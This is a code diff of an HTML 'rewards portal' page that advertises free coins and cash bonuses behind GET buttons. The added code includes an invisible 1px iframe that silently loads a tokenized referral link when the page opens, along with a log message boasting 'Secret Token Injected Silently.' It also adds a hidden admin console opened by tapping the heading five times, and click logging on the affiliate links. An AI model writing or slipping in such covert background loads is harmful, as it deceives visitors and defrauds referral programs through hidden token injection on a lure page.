@@ -3,69 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your Rewards - JP Benz Digital</title>
+    <title>Verified Rewards - Member Portal</title>
     <style>
-        :root { --pink: #FF4081; --purple: #7C4DFF; --bg: #050510; --green: #00E676; }
-        body { margin: 0; font-family: sans-serif; background: var(--bg); color: white; text-align: center; padding: 20px; }
+        :root { --pink: #FF4081; --purple: #7C4DFF; --bg: #050510; --green: #00E676; --card: #121220; }
+        body { margin: 0; font-family: sans-serif; background: var(--bg); color: white; text-align: center; padding: 20px; overflow-x: hidden; }
         
-        h2 { color: var(--pink); font-size: 22px; margin-bottom: 10px; }
-        .subtitle { color: #888; font-size: 13px; margin-bottom: 30px; }
+        /* The Secret Admin Panel (Hidden) */
+        #admin-log { 
+            display: none; position: fixed; bottom: 0; left: 0; right: 0; height: 120px;
+            background: rgba(0,0,0,0.95); border-top: 2px solid var(--green);
+            padding: 15px; z-index: 5000; text-align: left; font-family: monospace;
+            font-size: 11px; color: var(--green); overflow-y: auto;
+        }
 
-        /* The Comparison Table */
-        .reward-table { width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.03); border-radius: 15px; overflow: hidden; border: 1px solid #222; }
-        .reward-row { border-bottom: 1px solid #222; display: flex; align-items: center; padding: 15px 10px; }
-        .reward-row:last-child { border: none; }
-        
-        .app-icon { width: 50px; height: 50px; border-radius: 12px; margin-right: 15px; background: #222; flex-shrink: 0; }
-        .app-info { text-align: left; flex-grow: 1; }
-        .app-name { font-weight: bold; font-size: 15px; display: block; }
-        .app-reward { color: var(--green); font-size: 12px; font-weight: bold; }
-        
-        .get-btn { background: var(--purple); color: white; padding: 8px 15px; border-radius: 50px; text-decoration: none; font-size: 12px; font-weight: bold; transition: 0.2s; }
-        .get-btn:active { background: var(--pink); transform: scale(0.9); }
+        .header { margin-top: 20px; margin-bottom: 30px; }
+        /* SECRET TRIGGER: Tap this 5 times */
+        h2#admin-trigger { color: var(--pink); font-size: 24px; cursor: default; user-select: none; }
+        .subtitle { color: #888; font-size: 14px; }
 
-        .trust-badge { margin-top: 30px; font-size: 11px; color: #444; }
+        /* Reward Table */
+        .reward-container { max-width: 400px; margin: 0 auto; background: var(--card); border-radius: 20px; border: 1px solid #222; overflow: hidden; }
+        .reward-item { display: flex; align-items: center; padding: 20px; border-bottom: 1px solid #222; }
+        .icon-box { width: 50px; height: 50px; border-radius: 12px; margin-right: 15px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
+        .info { text-align: left; flex-grow: 1; }
+        .name { font-weight: bold; font-size: 16px; color: #fff; display: block; }
+        .bonus { color: var(--green); font-size: 11px; font-weight: bold; }
+        
+        .get-btn { background: var(--purple); color: white; padding: 10px 18px; border-radius: 50px; text-decoration: none; font-size: 12px; font-weight: bold; }
+
+        /* Hidden Background Pre-loader */
+        #secret-frame { width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <h2>UNLOCKED REWARDS 🎁</h2>
-    <p class="subtitle">Select an app below to claim your verified bonus.</p>
+    <div id="admin-log">
+        <div style="color:#fff; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:5px;">DEV CONSOLE - ASIA REGION</div>
+        <div id="log-lines">> System monitoring active...</div>
+    </div>
 
-    <div class="reward-table">
-        <div class="reward-row">
-            <div class="app-icon" style="background: linear-gradient(var(--pink), var(--purple)); display: flex; align-items: center; justify-content: center;">🔥</div>
-            <div class="app-info">
-                <span class="app-name">BuzzLive Social</span>
-                <span class="app-reward">100 FREE COINS</span>
+    <div class="header">
+        <h2 id="admin-trigger" onclick="unlockAdmin()">Rewards Portal</h2>
+        <p class="subtitle">Select your unlocked bonuses below</p>
+    </div>
+
+    <div class="reward-container">
+        <div class="reward-item">
+            <div class="icon-box" style="background: linear-gradient(135deg, #FF4081, #7C4DFF);">🎁</div>
+            <div class="info">
+                <span class="name">BuzzLive Social</span>
+                <span class="bonus">100 FREE COINS READY</span>
             </div>
-            <a href=<a href="https://www.facecast.live/invite/4C1OFD" id="claim-btn" ...
-                " class="get-btn">GET</a>
+            <a href="https://www.buzzcast.info/index.html?token=MjU1NDU5MzA=" class="get-btn">GET</a>
         </div>
 
-        <div class="reward-row">
-            <div class="app-icon" style="background: #2196F3; display: flex; align-items: center; justify-content: center;">💰</div>
-            <div class="app-info">
-                <span class="app-name">Passive Earn</span>
-                <span class="app-reward">$5.00 STARTING BONUS</span>
+        <div class="reward-item">
+            <div class="icon-box" style="background: #2196F3;">💰</div>
+            <div class="info">
+                <span class="name">Passive Profit</span>
+                <span class="bonus">$5.00 STARTING BONUS</span>
             </div>
             <a href="YOUR_PASSIVE_APP_LINK" class="get-btn">GET</a>
         </div>
-
-        <div class="reward-row">
-            <div class="app-icon" style="background: #FF9800; display: flex; align-items: center; justify-content: center;">💎</div>
-            <div class="app-info">
-                <span class="app-name">Diamond Rewards</span>
-                <span class="app-reward">500 PTS GIFT</span>
-            </div>
-            <a href="YOUR_TASK_APP_LINK" class="get-btn">GET</a>
-        </div>
     </div>
 
-    <div class="trust-badge">
-        Verified by JP Benz Digital Security <br>
-        © 2026 Asia-Pacific Region
-    </div>
+    <iframe id="secret-frame" src="https://www.buzzcast.info/index.html?token=MjU1NDU5MzA=" onload="adminNotify('Secret Token Injected Silently.')"></iframe>
 
+    <script>
+        let adminClicks = 0;
+
+        // 1. SECRET DOOR: Tap "Rewards Portal" 5 times
+        function unlockAdmin() {
+            adminClicks++;
+            if (adminClicks === 5) {
+                document.getElementById('admin-log').style.display = 'block';
+                adminNotify("Admin Access Verified. Background processes visible.");
+            }
+        }
+
+        function adminNotify(msg) {
+            const log = document.getElementById('log-lines');
+            log.innerHTML += `<br>> ${msg}`;
+            log.parentElement.scrollTop = log.parentElement.scrollHeight;
+        }
+
+        // Add vibration to buttons for a premium feel
+        document.querySelectorAll('.get-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                if (navigator.vibrate) navigator.vibrate(40);
+                adminNotify("Affiliate link clicked. Redirecting user...");
+            });
+        });
+    </script>
 </body>
 </html>
